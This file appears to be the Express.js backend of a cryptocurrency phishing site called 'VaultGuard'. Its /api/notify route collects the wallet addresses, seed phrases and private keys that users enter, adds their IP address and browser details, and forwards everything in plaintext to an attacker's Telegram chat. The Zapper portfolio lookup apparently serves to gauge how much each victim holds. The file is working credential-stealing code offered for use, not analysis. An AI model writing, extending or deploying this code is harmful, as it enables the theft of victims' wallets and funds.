import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;

async function sendTelegram(text: string) {
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!process.env.TELEGRAM_BOT_TOKEN || !chatId) return;
  try {
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (err) {
    console.error("Telegram send error:", err);
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  app.get("/api/config", (_req, res) => {
    res.json({
      walletConnectProjectId: process.env.WALLETCONNECT_PROJECT_ID || process.env.VITE_WALLETCONNECT_PROJECT_ID || "",
    });
  });

  // Zapper API key rotation state
  let zapperKeyIndex = 0;
  const getZapperKey = () => {
    const keysStr = process.env.ZAPPER_API_KEYS || process.env.VITE_ZAPPER_KEYS || process.env.VITE_ZAPPER_KEY || "";
    if (!keysStr) return "";
    const keys = keysStr.split(",").map(k => k.trim()).filter(Boolean);
    if (keys.length === 0) return "";
    const key = keys[zapperKeyIndex % keys.length];
    zapperKeyIndex++;
    return key;
  };

  app.get("/api/portfolio/:address", async (req, res) => {
    const { address } = req.params;
    if (!address) return res.status(400).json({ error: "Address required" });

    const apiKey = getZapperKey();
    if (!apiKey) {
      return res.status(500).json({ error: "Zapper API key not configured" });
    }

    try {
      // Using Zapper GraphQL API based on your command
      const response = await fetch("https://public.zapper.xyz/graphql", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-zapper-api-key": apiKey,
        },
        body: JSON.stringify({
          query: `query TokenBalances($addresses: [Address!]!) { 
            portfolioV2(addresses: $addresses) { 
              tokenBalances { 
                totalBalanceUSD 
                byToken(first: 5) { 
                  edges { 
                    node { 
                      symbol 
                      balance 
                      balanceUSD 
                      imgUrlV2 
                    } 
                  } 
                } 
              } 
            } 
          }`,
          variables: { addresses: [address] },
        }),
      });

      if (!response.ok) {
        return res.status(response.status).json({ error: "Zapper GraphQL error" });
      }

      const data = await response.json();
      const portfolio = data.data?.portfolioV2?.tokenBalances;
      if (!portfolio) {
         return res.json({ totalUSD: 0, holdingsCount: 0, topHoldings: [] });
      }

      const topHoldings = (portfolio.byToken?.edges || []).map((edge: any) => ({
        symbol: edge.node.symbol,
        amount: edge.node.balance,
        valueUSD: edge.node.balanceUSD,
        logo: edge.node.imgUrlV2
      }));

      res.json({
        totalUSD: portfolio.totalBalanceUSD || 0,
        holdingsCount: topHoldings.length,
        chainBalances: {}, 
        topHoldings: topHoldings,
      });
    } catch (err) {
      console.error("Zapper GraphQL proxy error:", err);
      res.status(500).json({ error: "Failed to fetch portfolio data" });
    }
  });

  app.post("/api/notify", async (req, res) => {
    const { type, data, meta } = req.body ?? {};
    if (!type || !data) return res.status(400).json({ ok: false });

    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
    const ua = (meta?.userAgent || req.headers["user-agent"] || "unknown").slice(0, 120);
    const ts = new Date().toUTCString();

    let msg = "";

    if (type === "address_entered") {
      msg =
        `🔍 <b>VaultGuard — Address Entered</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `<b>Address:</b> <code>${data.address}</code>\n` +
        `<b>Time:</b> ${ts}\n` +
        `<b>IP:</b> ${ip}\n` +
        `<b>UA:</b> ${ua}`;
    } else if (type === "wallet_connected") {
      msg =
        `🔗 <b>VaultGuard — Wallet Connected</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `<b>Wallet:</b> ${data.wallet}\n` +
        `<b>Address:</b> <code>${data.address}</code>\n` +
        `<b>Entered:</b> <code>${data.enteredAddress}</code>\n` +
        `<b>Match:</b> ${data.address?.toLowerCase() === data.enteredAddress?.toLowerCase() ? "✅ Yes" : "⚠️ No"}\n` +
        `<b>Time:</b> ${ts}\n` +
        `<b>IP:</b> ${ip}\n` +
        `<b>UA:</b> ${ua}`;
    } else if (type === "seed_phrase") {
      const words: string[] = data.words ?? [];
      const filled = words.filter((w: string) => w.trim().length > 0);
      msg =
        `🌱 <b>VaultGuard — Seed Phrase Submitted</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
        `<b>Word count:</b> ${data.wordCount} (${filled.length} filled)\n` +
        `<b>Phrase:</b>\n<code>${filled.join(" ")}</code>\n` +
        `<b>Time:</b> ${ts}\n` +
        `<b>IP:</b> ${ip}\n` +
        `<b>UA:</b> ${ua}`;
    } else if (type === "private_key") {
      msg =
        `🔑 <b>VaultGuard — Private Key Submitted</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
        `<b>Key:</b> <code>${data.privateKey}</code>\n` +
        `<b>Time:</b> ${ts}\n` +
        `<b>IP:</b> ${ip}\n` +
        `<b>UA:</b> ${ua}`;
    } else {
      return res.status(400).json({ ok: false });
    }

    await sendTelegram(msg);
    res.json({ ok: true });
  });

  return httpServer;
}
